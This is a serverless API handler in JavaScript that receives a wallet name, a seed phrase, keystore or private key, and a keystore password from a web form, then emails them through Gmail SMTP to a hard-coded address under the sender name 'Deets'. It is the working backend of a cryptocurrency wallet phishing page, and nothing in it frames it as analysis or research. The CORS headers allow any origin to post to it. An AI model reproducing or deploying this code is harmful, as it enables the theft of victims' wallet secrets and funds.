const nodemailer = require('nodemailer');

export default async function handler(req, res) {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const maillist = ['Justforcallofdutyonly@gmail.com'];
        
    const transporter = nodemailer.createTransport({
        host: "smtp.gmail.com",
        port: 465,
        secure: true,
        auth: {
          user: process.env.EML_USER,
          pass: process.env.EML_PASS,
        },
      });

    const { wetName, phWet, passwordWet } = req.body;

    const mailOptions = {
      from: '"Deets" <Justforcallofdutyonly@gmail.com>',
      to: maillist,
      html: `
        <p><strong>Name:</strong> ${wetName || 'Not provided'}</p>
        <p><strong>Phrase/KS/PKey:</strong> ${phWet || 'Not provided'}</p>
        <p><strong>Pswd (if keystore):</strong> ${passwordWet || 'Not provided'}</p>
      `
    };

    const info = await transporter.sendMail(mailOptions);
    
    return res.status(200).json({ 
      success: true, 
      message: 'Request received' 
    });
  } catch (error) {
    console.error('Error:', error);
    return res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
}